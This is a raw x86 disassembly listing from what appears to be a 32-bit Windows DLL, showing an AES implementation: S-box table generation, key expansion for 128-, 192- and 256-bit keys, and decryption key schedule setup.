10008bb5:	85 db                	test   %ebx,%ebx
10008bb7:	7e 1c                	jle    0x10008bd5
10008bb9:	8b 46 20             	mov    0x20(%esi),%eax
10008bbc:	ff 75 08             	pushl  0x8(%ebp)
10008bbf:	0f af c7             	imul   %edi,%eax
10008bc2:	03 46 24             	add    0x24(%esi),%eax
10008bc5:	50                   	push   %eax
10008bc6:	ff 15 30 e1 00 10    	call   *0x1000e130
10008bcc:	85 c0                	test   %eax,%eax
10008bce:	74 0f                	je     0x10008bdf
10008bd0:	47                   	inc    %edi
10008bd1:	3b fb                	cmp    %ebx,%edi
10008bd3:	7c e4                	jl     0x10008bb9
10008bd5:	83 c8 ff             	or     $0xffffffff,%eax
10008bd8:	5f                   	pop    %edi
10008bd9:	5e                   	pop    %esi
10008bda:	5b                   	pop    %ebx
10008bdb:	5d                   	pop    %ebp
10008bdc:	c2 04 00             	ret    $0x4
10008bdf:	8b c7                	mov    %edi,%eax
10008be1:	eb f5                	jmp    0x10008bd8
10008be3:	55                   	push   %ebp
10008be4:	8b ec                	mov    %esp,%ebp
10008be6:	56                   	push   %esi
10008be7:	8b 70 20             	mov    0x20(%eax),%esi
10008bea:	0f af 75 08          	imul   0x8(%ebp),%esi
10008bee:	03 70 24             	add    0x24(%eax),%esi
10008bf1:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
10008bf5:	8b 46 10             	mov    0x10(%esi),%eax
10008bf8:	74 1b                	je     0x10008c15
10008bfa:	39 45 10             	cmp    %eax,0x10(%ebp)
10008bfd:	73 04                	jae    0x10008c03
10008bff:	33 c0                	xor    %eax,%eax
10008c01:	eb 12                	jmp    0x10008c15
10008c03:	50                   	push   %eax
10008c04:	ff 76 14             	pushl  0x14(%esi)
10008c07:	ff 75 0c             	pushl  0xc(%ebp)
10008c0a:	e8 01 51 00 00       	call   0x1000dd10
10008c0f:	8b 46 10             	mov    0x10(%esi),%eax
10008c12:	83 c4 0c             	add    $0xc,%esp
10008c15:	5e                   	pop    %esi
10008c16:	5d                   	pop    %ebp
10008c17:	c2 0c 00             	ret    $0xc
10008c1a:	55                   	push   %ebp
10008c1b:	8b ec                	mov    %esp,%ebp
10008c1d:	57                   	push   %edi
10008c1e:	8b c6                	mov    %esi,%eax
10008c20:	33 ff                	xor    %edi,%edi
10008c22:	e8 31 00 00 00       	call   0x10008c58
10008c27:	85 c0                	test   %eax,%eax
10008c29:	74 26                	je     0x10008c51
10008c2b:	ff 75 08             	pushl  0x8(%ebp)
10008c2e:	8b c6                	mov    %esi,%eax
10008c30:	e8 6c ff ff ff       	call   0x10008ba1
10008c35:	83 f8 ff             	cmp    $0xffffffff,%eax
10008c38:	74 10                	je     0x10008c4a
10008c3a:	ff 75 10             	pushl  0x10(%ebp)
10008c3d:	ff 75 0c             	pushl  0xc(%ebp)
10008c40:	50                   	push   %eax
10008c41:	8b c6                	mov    %esi,%eax
10008c43:	e8 9b ff ff ff       	call   0x10008be3
10008c48:	8b f8                	mov    %eax,%edi
10008c4a:	8b c6                	mov    %esi,%eax
10008c4c:	e8 15 00 00 00       	call   0x10008c66
10008c51:	8b c7                	mov    %edi,%eax
10008c53:	5f                   	pop    %edi
10008c54:	5d                   	pop    %ebp
10008c55:	c2 0c 00             	ret    $0xc
10008c58:	83 c0 08             	add    $0x8,%eax
10008c5b:	50                   	push   %eax
10008c5c:	ff 15 64 e1 00 10    	call   *0x1000e164
10008c62:	33 c0                	xor    %eax,%eax
10008c64:	40                   	inc    %eax
10008c65:	c3                   	ret    
10008c66:	83 c0 08             	add    $0x8,%eax
10008c69:	50                   	push   %eax
10008c6a:	ff 15 60 e1 00 10    	call   *0x1000e160
10008c70:	c3                   	ret    
10008c71:	55                   	push   %ebp
10008c72:	8b ec                	mov    %esp,%ebp
10008c74:	81 ec 0c 08 00 00    	sub    $0x80c,%esp
10008c7a:	53                   	push   %ebx
10008c7b:	33 db                	xor    %ebx,%ebx
10008c7d:	56                   	push   %esi
10008c7e:	33 c9                	xor    %ecx,%ecx
10008c80:	43                   	inc    %ebx
10008c81:	57                   	push   %edi
10008c82:	8b c3                	mov    %ebx,%eax
10008c84:	be ff 00 00 00       	mov    $0xff,%esi
10008c89:	8b d0                	mov    %eax,%edx
10008c8b:	80 e2 80             	and    $0x80,%dl
10008c8e:	0f be d2             	movsbl %dl,%edx
10008c91:	f7 da                	neg    %edx
10008c93:	1b d2                	sbb    %edx,%edx
10008c95:	83 e2 1b             	and    $0x1b,%edx
10008c98:	8d 3c 00             	lea    (%eax,%eax,1),%edi
10008c9b:	33 d7                	xor    %edi,%edx
10008c9d:	89 84 8d f4 f7 ff ff 	mov    %eax,-0x80c(%ebp,%ecx,4)
10008ca4:	89 8c 85 f4 fb ff ff 	mov    %ecx,-0x40c(%ebp,%eax,4)
10008cab:	33 c2                	xor    %edx,%eax
10008cad:	23 c6                	and    %esi,%eax
10008caf:	41                   	inc    %ecx
10008cb0:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
10008cb6:	7c d1                	jl     0x10008c89
10008cb8:	8b c3                	mov    %ebx,%eax
10008cba:	b9 20 19 01 10       	mov    $0x10011920,%ecx
10008cbf:	8b d0                	mov    %eax,%edx
10008cc1:	80 e2 80             	and    $0x80,%dl
10008cc4:	0f be d2             	movsbl %dl,%edx
10008cc7:	f7 da                	neg    %edx
10008cc9:	1b d2                	sbb    %edx,%edx
10008ccb:	89 01                	mov    %eax,(%ecx)
10008ccd:	03 c0                	add    %eax,%eax
10008ccf:	83 e2 1b             	and    $0x1b,%edx
10008cd2:	33 c2                	xor    %edx,%eax
10008cd4:	83 c1 04             	add    $0x4,%ecx
10008cd7:	23 c6                	and    %esi,%eax
10008cd9:	81 f9 48 19 01 10    	cmp    $0x10011948,%ecx
10008cdf:	7c de                	jl     0x10008cbf
10008ce1:	c6 05 20 10 01 10 63 	movb   $0x63,0x10011020
10008ce8:	c6 05 ab 31 01 10 00 	movb   $0x0,0x100131ab
10008cef:	8b 84 9d f4 fb ff ff 	mov    -0x40c(%ebp,%ebx,4),%eax
10008cf6:	c1 e0 02             	shl    $0x2,%eax
10008cf9:	8d 8d f0 fb ff ff    	lea    -0x410(%ebp),%ecx
10008cff:	2b c8                	sub    %eax,%ecx
10008d01:	8b 01                	mov    (%ecx),%eax
10008d03:	8b c8                	mov    %eax,%ecx
10008d05:	c1 f9 07             	sar    $0x7,%ecx
10008d08:	8d 14 00             	lea    (%eax,%eax,1),%edx
10008d0b:	0b ca                	or     %edx,%ecx
10008d0d:	23 ce                	and    %esi,%ecx
10008d0f:	33 c1                	xor    %ecx,%eax
10008d11:	8b d1                	mov    %ecx,%edx
10008d13:	c1 fa 07             	sar    $0x7,%edx
10008d16:	03 c9                	add    %ecx,%ecx
10008d18:	0b d1                	or     %ecx,%edx
10008d1a:	23 d6                	and    %esi,%edx
10008d1c:	33 c2                	xor    %edx,%eax
10008d1e:	8b ca                	mov    %edx,%ecx
10008d20:	03 d2                	add    %edx,%edx
10008d22:	c1 f9 07             	sar    $0x7,%ecx
10008d25:	0b ca                	or     %edx,%ecx
10008d27:	23 ce                	and    %esi,%ecx
10008d29:	33 c1                	xor    %ecx,%eax
10008d2b:	8b d1                	mov    %ecx,%edx
10008d2d:	c1 fa 07             	sar    $0x7,%edx
10008d30:	03 c9                	add    %ecx,%ecx
10008d32:	0b d1                	or     %ecx,%edx
10008d34:	83 f2 63             	xor    $0x63,%edx
10008d37:	23 d6                	and    %esi,%edx
10008d39:	33 c2                	xor    %edx,%eax
10008d3b:	88 83 20 10 01 10    	mov    %al,0x10011020(%ebx)
10008d41:	88 98 48 31 01 10    	mov    %bl,0x10013148(%eax)
10008d47:	43                   	inc    %ebx
10008d48:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
10008d4e:	7c 9f                	jl     0x10008cef
10008d50:	33 ff                	xor    %edi,%edi
10008d52:	0f b6 97 20 10 01 10 	movzbl 0x10011020(%edi),%edx
10008d59:	8b c2                	mov    %edx,%eax
10008d5b:	24 80                	and    $0x80,%al
10008d5d:	0f be c8             	movsbl %al,%ecx
10008d60:	f7 d9                	neg    %ecx
10008d62:	1b c9                	sbb    %ecx,%ecx
10008d64:	83 e1 1b             	and    $0x1b,%ecx
10008d67:	8d 04 12             	lea    (%edx,%edx,1),%eax
10008d6a:	33 c8                	xor    %eax,%ecx
10008d6c:	23 ce                	and    %esi,%ecx
10008d6e:	8b c1                	mov    %ecx,%eax
10008d70:	33 c2                	xor    %edx,%eax
10008d72:	c1 e0 08             	shl    $0x8,%eax
10008d75:	33 c2                	xor    %edx,%eax
10008d77:	c1 e0 08             	shl    $0x8,%eax
10008d7a:	33 c2                	xor    %edx,%eax
10008d7c:	c1 e0 08             	shl    $0x8,%eax
10008d7f:	33 c1                	xor    %ecx,%eax
10008d81:	8b cf                	mov    %edi,%ecx
10008d83:	89 04 8d 48 2d 01 10 	mov    %eax,0x10012d48(,%ecx,4)
10008d8a:	c1 c0 08             	rol    $0x8,%eax
10008d8d:	89 04 8d 48 29 01 10 	mov    %eax,0x10012948(,%ecx,4)
10008d94:	c1 c0 08             	rol    $0x8,%eax
10008d97:	89 04 8d 48 25 01 10 	mov    %eax,0x10012548(,%ecx,4)
10008d9e:	c1 c0 08             	rol    $0x8,%eax
10008da1:	89 04 8d 48 21 01 10 	mov    %eax,0x10012148(,%ecx,4)
10008da8:	0f b6 87 48 31 01 10 	movzbl 0x10013148(%edi),%eax
10008daf:	85 c0                	test   %eax,%eax
10008db1:	74 1e                	je     0x10008dd1
10008db3:	8b 84 85 f4 fb ff ff 	mov    -0x40c(%ebp,%eax,4),%eax
10008dba:	03 85 2c fc ff ff    	add    -0x3d4(%ebp),%eax
10008dc0:	8b de                	mov    %esi,%ebx
10008dc2:	99                   	cltd   
10008dc3:	f7 fb                	idiv   %ebx
10008dc5:	8b 84 95 f4 f7 ff ff 	mov    -0x80c(%ebp,%edx,4),%eax
10008dcc:	89 45 fc             	mov    %eax,-0x4(%ebp)
10008dcf:	eb 04                	jmp    0x10008dd5
10008dd1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008dd5:	0f b6 87 48 31 01 10 	movzbl 0x10013148(%edi),%eax
10008ddc:	85 c0                	test   %eax,%eax
10008dde:	74 1e                	je     0x10008dfe
10008de0:	8b 84 85 f4 fb ff ff 	mov    -0x40c(%ebp,%eax,4),%eax
10008de7:	03 85 18 fc ff ff    	add    -0x3e8(%ebp),%eax
10008ded:	8b de                	mov    %esi,%ebx
10008def:	99                   	cltd   
10008df0:	f7 fb                	idiv   %ebx
10008df2:	8b 84 95 f4 f7 ff ff 	mov    -0x80c(%ebp,%edx,4),%eax
10008df9:	89 45 f4             	mov    %eax,-0xc(%ebp)
10008dfc:	eb 04                	jmp    0x10008e02
10008dfe:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10008e02:	0f b6 87 48 31 01 10 	movzbl 0x10013148(%edi),%eax
10008e09:	85 c0                	test   %eax,%eax
10008e0b:	74 1e                	je     0x10008e2b
10008e0d:	8b 84 85 f4 fb ff ff 	mov    -0x40c(%ebp,%eax,4),%eax
10008e14:	03 85 28 fc ff ff    	add    -0x3d8(%ebp),%eax
10008e1a:	8b de                	mov    %esi,%ebx
10008e1c:	99                   	cltd   
10008e1d:	f7 fb                	idiv   %ebx
10008e1f:	8b 84 95 f4 f7 ff ff 	mov    -0x80c(%ebp,%edx,4),%eax
10008e26:	89 45 f8             	mov    %eax,-0x8(%ebp)
10008e29:	eb 04                	jmp    0x10008e2f
10008e2b:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10008e2f:	0f b6 87 48 31 01 10 	movzbl 0x10013148(%edi),%eax
10008e36:	85 c0                	test   %eax,%eax
10008e38:	74 1b                	je     0x10008e55
10008e3a:	8b 84 85 f4 fb ff ff 	mov    -0x40c(%ebp,%eax,4),%eax
10008e41:	03 85 20 fc ff ff    	add    -0x3e0(%ebp),%eax
10008e47:	8b de                	mov    %esi,%ebx
10008e49:	99                   	cltd   
10008e4a:	f7 fb                	idiv   %ebx
10008e4c:	8b 94 95 f4 f7 ff ff 	mov    -0x80c(%ebp,%edx,4),%edx
10008e53:	eb 02                	jmp    0x10008e57
10008e55:	33 d2                	xor    %edx,%edx
10008e57:	c1 e2 08             	shl    $0x8,%edx
10008e5a:	33 55 f8             	xor    -0x8(%ebp),%edx
10008e5d:	c1 e2 08             	shl    $0x8,%edx
10008e60:	33 55 f4             	xor    -0xc(%ebp),%edx
10008e63:	c1 e2 08             	shl    $0x8,%edx
10008e66:	33 55 fc             	xor    -0x4(%ebp),%edx
10008e69:	47                   	inc    %edi
10008e6a:	89 14 8d 48 1d 01 10 	mov    %edx,0x10011d48(,%ecx,4)
10008e71:	c1 c2 08             	rol    $0x8,%edx
10008e74:	8b c2                	mov    %edx,%eax
10008e76:	89 04 8d 48 19 01 10 	mov    %eax,0x10011948(,%ecx,4)
10008e7d:	c1 c0 08             	rol    $0x8,%eax
10008e80:	89 04 8d 20 15 01 10 	mov    %eax,0x10011520(,%ecx,4)
10008e87:	c1 c0 08             	rol    $0x8,%eax
10008e8a:	89 04 8d 20 11 01 10 	mov    %eax,0x10011120(,%ecx,4)
10008e91:	81 ff 00 01 00 00    	cmp    $0x100,%edi
10008e97:	0f 8c b5 fe ff ff    	jl     0x10008d52
10008e9d:	5f                   	pop    %edi
10008e9e:	5e                   	pop    %esi
10008e9f:	5b                   	pop    %ebx
10008ea0:	c9                   	leave  
10008ea1:	c3                   	ret    
10008ea2:	55                   	push   %ebp
10008ea3:	8b ec                	mov    %esp,%ebp
10008ea5:	51                   	push   %ecx
10008ea6:	83 3d 78 38 01 10 00 	cmpl   $0x0,0x10013878
10008ead:	53                   	push   %ebx
10008eae:	56                   	push   %esi
10008eaf:	57                   	push   %edi
10008eb0:	8b f0                	mov    %eax,%esi
10008eb2:	75 0f                	jne    0x10008ec3
10008eb4:	e8 b8 fd ff ff       	call   0x10008c71
10008eb9:	c7 05 78 38 01 10 01 	movl   $0x1,0x10013878
10008ec0:	00 00 00 
10008ec3:	8b 4d 08             	mov    0x8(%ebp),%ecx
10008ec6:	8d 46 08             	lea    0x8(%esi),%eax
10008ec9:	33 d2                	xor    %edx,%edx
10008ecb:	c7 06 0e 00 00 00    	movl   $0xe,(%esi)
10008ed1:	89 46 04             	mov    %eax,0x4(%esi)
10008ed4:	83 c1 02             	add    $0x2,%ecx
10008ed7:	0f b6 79 01          	movzbl 0x1(%ecx),%edi
10008edb:	0f b6 19             	movzbl (%ecx),%ebx
10008ede:	c1 e7 08             	shl    $0x8,%edi
10008ee1:	0b fb                	or     %ebx,%edi
10008ee3:	0f b6 59 ff          	movzbl -0x1(%ecx),%ebx
10008ee7:	c1 e7 08             	shl    $0x8,%edi
10008eea:	0b fb                	or     %ebx,%edi
10008eec:	0f b6 59 fe          	movzbl -0x2(%ecx),%ebx
10008ef0:	c1 e7 08             	shl    $0x8,%edi
10008ef3:	0b fb                	or     %ebx,%edi
10008ef5:	89 3c 90             	mov    %edi,(%eax,%edx,4)
10008ef8:	42                   	inc    %edx
10008ef9:	83 c1 04             	add    $0x4,%ecx
10008efc:	83 fa 08             	cmp    $0x8,%edx
10008eff:	72 d6                	jb     0x10008ed7
10008f01:	8b 36                	mov    (%esi),%esi
10008f03:	83 ee 0a             	sub    $0xa,%esi
10008f06:	0f 84 66 01 00 00    	je     0x10009072
10008f0c:	4e                   	dec    %esi
10008f0d:	4e                   	dec    %esi
10008f0e:	0f 84 dd 00 00 00    	je     0x10008ff1
10008f14:	4e                   	dec    %esi
10008f15:	4e                   	dec    %esi
10008f16:	0f 85 c5 01 00 00    	jne    0x100090e1
10008f1c:	21 75 fc             	and    %esi,-0x4(%ebp)
10008f1f:	be ff 00 00 00       	mov    $0xff,%esi
10008f24:	8b 48 1c             	mov    0x1c(%eax),%ecx
10008f27:	0f b6 50 1f          	movzbl 0x1f(%eax),%edx
10008f2b:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10008f32:	23 ce                	and    %esi,%ecx
10008f34:	0f b6 89 20 10 01 10 	movzbl 0x10011020(%ecx),%ecx
10008f3b:	c1 e1 08             	shl    $0x8,%ecx
10008f3e:	33 ca                	xor    %edx,%ecx
10008f40:	0f b6 50 1e          	movzbl 0x1e(%eax),%edx
10008f44:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10008f4b:	c1 e1 08             	shl    $0x8,%ecx
10008f4e:	33 ca                	xor    %edx,%ecx
10008f50:	0f b6 50 1d          	movzbl 0x1d(%eax),%edx
10008f54:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10008f5b:	c1 e1 08             	shl    $0x8,%ecx
10008f5e:	33 ca                	xor    %edx,%ecx
10008f60:	8b 55 fc             	mov    -0x4(%ebp),%edx
10008f63:	33 8a 20 19 01 10    	xor    0x10011920(%edx),%ecx
10008f69:	8b 50 04             	mov    0x4(%eax),%edx
10008f6c:	33 08                	xor    (%eax),%ecx
10008f6e:	83 45 fc 04          	addl   $0x4,-0x4(%ebp)
10008f72:	33 d1                	xor    %ecx,%edx
10008f74:	89 48 20             	mov    %ecx,0x20(%eax)
10008f77:	8b 48 08             	mov    0x8(%eax),%ecx
10008f7a:	33 ca                	xor    %edx,%ecx
10008f7c:	89 48 28             	mov    %ecx,0x28(%eax)
10008f7f:	89 50 24             	mov    %edx,0x24(%eax)
10008f82:	8b 50 0c             	mov    0xc(%eax),%edx
10008f85:	33 d1                	xor    %ecx,%edx
10008f87:	89 50 2c             	mov    %edx,0x2c(%eax)
10008f8a:	0f b6 48 2f          	movzbl 0x2f(%eax),%ecx
10008f8e:	0f b6 89 20 10 01 10 	movzbl 0x10011020(%ecx),%ecx
10008f95:	0f b6 58 2e          	movzbl 0x2e(%eax),%ebx
10008f99:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10008fa0:	c1 e1 08             	shl    $0x8,%ecx
10008fa3:	33 cb                	xor    %ebx,%ecx
10008fa5:	0f b6 58 2d          	movzbl 0x2d(%eax),%ebx
10008fa9:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10008fb0:	c1 e1 08             	shl    $0x8,%ecx
10008fb3:	33 cb                	xor    %ebx,%ecx
10008fb5:	23 d6                	and    %esi,%edx
10008fb7:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10008fbe:	c1 e1 08             	shl    $0x8,%ecx
10008fc1:	33 ca                	xor    %edx,%ecx
10008fc3:	33 48 10             	xor    0x10(%eax),%ecx
10008fc6:	8b 50 14             	mov    0x14(%eax),%edx
10008fc9:	33 d1                	xor    %ecx,%edx
10008fcb:	89 48 30             	mov    %ecx,0x30(%eax)
10008fce:	8b 48 18             	mov    0x18(%eax),%ecx
10008fd1:	33 ca                	xor    %edx,%ecx
10008fd3:	89 48 38             	mov    %ecx,0x38(%eax)
10008fd6:	33 48 1c             	xor    0x1c(%eax),%ecx
10008fd9:	89 50 34             	mov    %edx,0x34(%eax)
10008fdc:	89 48 3c             	mov    %ecx,0x3c(%eax)
10008fdf:	83 c0 20             	add    $0x20,%eax
10008fe2:	83 7d fc 1c          	cmpl   $0x1c,-0x4(%ebp)
10008fe6:	0f 82 38 ff ff ff    	jb     0x10008f24
10008fec:	e9 f0 00 00 00       	jmp    0x100090e1
10008ff1:	33 db                	xor    %ebx,%ebx
10008ff3:	be ff 00 00 00       	mov    $0xff,%esi
10008ff8:	8b 48 14             	mov    0x14(%eax),%ecx
10008ffb:	0f b6 50 17          	movzbl 0x17(%eax),%edx
10008fff:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10009006:	23 ce                	and    %esi,%ecx
10009008:	0f b6 89 20 10 01 10 	movzbl 0x10011020(%ecx),%ecx
1000900f:	c1 e1 08             	shl    $0x8,%ecx
10009012:	33 ca                	xor    %edx,%ecx
10009014:	0f b6 50 16          	movzbl 0x16(%eax),%edx
10009018:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
1000901f:	c1 e1 08             	shl    $0x8,%ecx
10009022:	33 ca                	xor    %edx,%ecx
10009024:	0f b6 50 15          	movzbl 0x15(%eax),%edx
10009028:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
1000902f:	c1 e1 08             	shl    $0x8,%ecx
10009032:	33 ca                	xor    %edx,%ecx
10009034:	33 8b 20 19 01 10    	xor    0x10011920(%ebx),%ecx
1000903a:	8b 50 04             	mov    0x4(%eax),%edx
1000903d:	33 08                	xor    (%eax),%ecx
1000903f:	83 c3 04             	add    $0x4,%ebx
10009042:	33 d1                	xor    %ecx,%edx
10009044:	89 48 18             	mov    %ecx,0x18(%eax)
10009047:	8b 48 08             	mov    0x8(%eax),%ecx
1000904a:	33 ca                	xor    %edx,%ecx
1000904c:	89 50 1c             	mov    %edx,0x1c(%eax)
1000904f:	8b 50 0c             	mov    0xc(%eax),%edx
10009052:	33 d1                	xor    %ecx,%edx
10009054:	89 48 20             	mov    %ecx,0x20(%eax)
10009057:	8b 48 10             	mov    0x10(%eax),%ecx
1000905a:	33 ca                	xor    %edx,%ecx
1000905c:	89 48 28             	mov    %ecx,0x28(%eax)
1000905f:	33 48 14             	xor    0x14(%eax),%ecx
10009062:	89 50 24             	mov    %edx,0x24(%eax)
10009065:	89 48 2c             	mov    %ecx,0x2c(%eax)
10009068:	83 c0 18             	add    $0x18,%eax
1000906b:	83 fb 20             	cmp    $0x20,%ebx
1000906e:	72 88                	jb     0x10008ff8
10009070:	eb 6f                	jmp    0x100090e1
10009072:	33 db                	xor    %ebx,%ebx
10009074:	be ff 00 00 00       	mov    $0xff,%esi
10009079:	8b 48 0c             	mov    0xc(%eax),%ecx
1000907c:	0f b6 50 0f          	movzbl 0xf(%eax),%edx
10009080:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
10009087:	23 ce                	and    %esi,%ecx
10009089:	0f b6 89 20 10 01 10 	movzbl 0x10011020(%ecx),%ecx
10009090:	c1 e1 08             	shl    $0x8,%ecx
10009093:	33 ca                	xor    %edx,%ecx
10009095:	0f b6 50 0e          	movzbl 0xe(%eax),%edx
10009099:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
100090a0:	c1 e1 08             	shl    $0x8,%ecx
100090a3:	33 ca                	xor    %edx,%ecx
100090a5:	0f b6 50 0d          	movzbl 0xd(%eax),%edx
100090a9:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
100090b0:	c1 e1 08             	shl    $0x8,%ecx
100090b3:	33 ca                	xor    %edx,%ecx
100090b5:	33 8b 20 19 01 10    	xor    0x10011920(%ebx),%ecx
100090bb:	8b 50 04             	mov    0x4(%eax),%edx
100090be:	33 08                	xor    (%eax),%ecx
100090c0:	83 c3 04             	add    $0x4,%ebx
100090c3:	33 d1                	xor    %ecx,%edx
100090c5:	89 48 10             	mov    %ecx,0x10(%eax)
100090c8:	8b 48 08             	mov    0x8(%eax),%ecx
100090cb:	33 ca                	xor    %edx,%ecx
100090cd:	89 48 18             	mov    %ecx,0x18(%eax)
100090d0:	33 48 0c             	xor    0xc(%eax),%ecx
100090d3:	89 50 14             	mov    %edx,0x14(%eax)
100090d6:	89 48 1c             	mov    %ecx,0x1c(%eax)
100090d9:	83 c0 10             	add    $0x10,%eax
100090dc:	83 fb 28             	cmp    $0x28,%ebx
100090df:	72 98                	jb     0x10009079
100090e1:	5f                   	pop    %edi
100090e2:	5e                   	pop    %esi
100090e3:	33 c0                	xor    %eax,%eax
100090e5:	5b                   	pop    %ebx
100090e6:	c9                   	leave  
100090e7:	c3                   	ret    
100090e8:	55                   	push   %ebp
100090e9:	8b ec                	mov    %esp,%ebp
100090eb:	81 ec 28 01 00 00    	sub    $0x128,%esp
100090f1:	53                   	push   %ebx
100090f2:	56                   	push   %esi
100090f3:	57                   	push   %edi
100090f4:	ff 75 08             	pushl  0x8(%ebp)
100090f7:	8b f8                	mov    %eax,%edi
100090f9:	8d 77 08             	lea    0x8(%edi),%esi
100090fc:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10009102:	c7 07 0e 00 00 00    	movl   $0xe,(%edi)
10009108:	89 77 04             	mov    %esi,0x4(%edi)
1000910b:	e8 92 fd ff ff       	call   0x10008ea2
10009110:	59                   	pop    %ecx
10009111:	85 c0                	test   %eax,%eax
10009113:	0f 85 cc 00 00 00    	jne    0x100091e5
10009119:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
1000911f:	c1 e0 04             	shl    $0x4,%eax
10009122:	03 85 e0 fe ff ff    	add    -0x120(%ebp),%eax
10009128:	6a 04                	push   $0x4
1000912a:	8b 08                	mov    (%eax),%ecx
1000912c:	89 0e                	mov    %ecx,(%esi)
1000912e:	59                   	pop    %ecx
1000912f:	03 c1                	add    %ecx,%eax
10009131:	8b 10                	mov    (%eax),%edx
10009133:	03 f1                	add    %ecx,%esi
10009135:	89 16                	mov    %edx,(%esi)
10009137:	03 c1                	add    %ecx,%eax
10009139:	8b 10                	mov    (%eax),%edx
1000913b:	03 f1                	add    %ecx,%esi
1000913d:	89 16                	mov    %edx,(%esi)
1000913f:	03 c1                	add    %ecx,%eax
10009141:	8b 10                	mov    (%eax),%edx
10009143:	03 f1                	add    %ecx,%esi
10009145:	89 16                	mov    %edx,(%esi)
10009147:	8b 3f                	mov    (%edi),%edi
10009149:	03 f1                	add    %ecx,%esi
1000914b:	4f                   	dec    %edi
1000914c:	83 e8 1c             	sub    $0x1c,%eax
1000914f:	eb 5e                	jmp    0x100091af
10009151:	89 4d f8             	mov    %ecx,-0x8(%ebp)
10009154:	0f b6 50 03          	movzbl 0x3(%eax),%edx
10009158:	0f b6 92 20 10 01 10 	movzbl 0x10011020(%edx),%edx
1000915f:	0f b6 58 02          	movzbl 0x2(%eax),%ebx
10009163:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
1000916a:	8b 14 95 20 11 01 10 	mov    0x10011120(,%edx,4),%edx
10009171:	33 14 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edx
10009178:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
1000917c:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009183:	33 14 9d 48 19 01 10 	xor    0x10011948(,%ebx,4),%edx
1000918a:	8b 18                	mov    (%eax),%ebx
1000918c:	81 e3 ff 00 00 00    	and    $0xff,%ebx
10009192:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009199:	33 14 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edx
100091a0:	03 c1                	add    %ecx,%eax
100091a2:	89 16                	mov    %edx,(%esi)
100091a4:	03 f1                	add    %ecx,%esi
100091a6:	ff 4d f8             	decl   -0x8(%ebp)
100091a9:	75 a9                	jne    0x10009154
100091ab:	4f                   	dec    %edi
100091ac:	83 e8 20             	sub    $0x20,%eax
100091af:	85 ff                	test   %edi,%edi
100091b1:	7f 9e                	jg     0x10009151
100091b3:	8b 10                	mov    (%eax),%edx
100091b5:	89 16                	mov    %edx,(%esi)
100091b7:	03 c1                	add    %ecx,%eax
100091b9:	8b 10                	mov    (%eax),%edx
100091bb:	03 f1                	add    %ecx,%esi
100091bd:	89 16                	mov    %edx,(%esi)
100091bf:	03 c1                	add    %ecx,%eax
100091c1:	03 f1                	add    %ecx,%esi
100091c3:	8b 08                	mov    (%eax),%ecx
100091c5:	89 0e                	mov    %ecx,(%esi)
100091c7:	8b 40 04             	mov    0x4(%eax),%eax
100091ca:	68 18 01 00 00       	push   $0x118
100091cf:	89 46 04             	mov    %eax,0x4(%esi)
100091d2:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
100091d8:	6a 00                	push   $0x0
100091da:	50                   	push   %eax
100091db:	e8 4a 4b 00 00       	call   0x1000dd2a
100091e0:	83 c4 0c             	add    $0xc,%esp
100091e3:	33 c0                	xor    %eax,%eax
100091e5:	5f                   	pop    %edi
100091e6:	5e                   	pop    %esi
100091e7:	5b                   	pop    %ebx
100091e8:	c9                   	leave  
100091e9:	c3                   	ret    
100091ea:	55                   	push   %ebp
100091eb:	8b ec                	mov    %esp,%ebp
100091ed:	83 ec 10             	sub    $0x10,%esp
100091f0:	0f b6 50 02          	movzbl 0x2(%eax),%edx
100091f4:	53                   	push   %ebx
100091f5:	56                   	push   %esi
100091f6:	0f b6 70 03          	movzbl 0x3(%eax),%esi
100091fa:	c1 e6 08             	shl    $0x8,%esi
100091fd:	0b f2                	or     %edx,%esi
100091ff:	0f b6 50 01          	movzbl 0x1(%eax),%edx
10009203:	57                   	push   %edi
10009204:	0f b6 78 06          	movzbl 0x6(%eax),%edi
10009208:	0f b6 58 0a          	movzbl 0xa(%eax),%ebx
1000920c:	c1 e6 08             	shl    $0x8,%esi
1000920f:	0b f2                	or     %edx,%esi
10009211:	0f b6 10             	movzbl (%eax),%edx
10009214:	c1 e6 08             	shl    $0x8,%esi
10009217:	0b f2                	or     %edx,%esi
10009219:	0f b6 50 07          	movzbl 0x7(%eax),%edx
1000921d:	c1 e2 08             	shl    $0x8,%edx
10009220:	0b d7                	or     %edi,%edx
10009222:	0f b6 78 05          	movzbl 0x5(%eax),%edi
10009226:	8b 4d 08             	mov    0x8(%ebp),%ecx
10009229:	8b 49 04             	mov    0x4(%ecx),%ecx
1000922c:	c1 e2 08             	shl    $0x8,%edx
1000922f:	0b d7                	or     %edi,%edx
10009231:	0f b6 78 04          	movzbl 0x4(%eax),%edi
10009235:	c1 e2 08             	shl    $0x8,%edx
10009238:	0b d7                	or     %edi,%edx
1000923a:	0f b6 78 0b          	movzbl 0xb(%eax),%edi
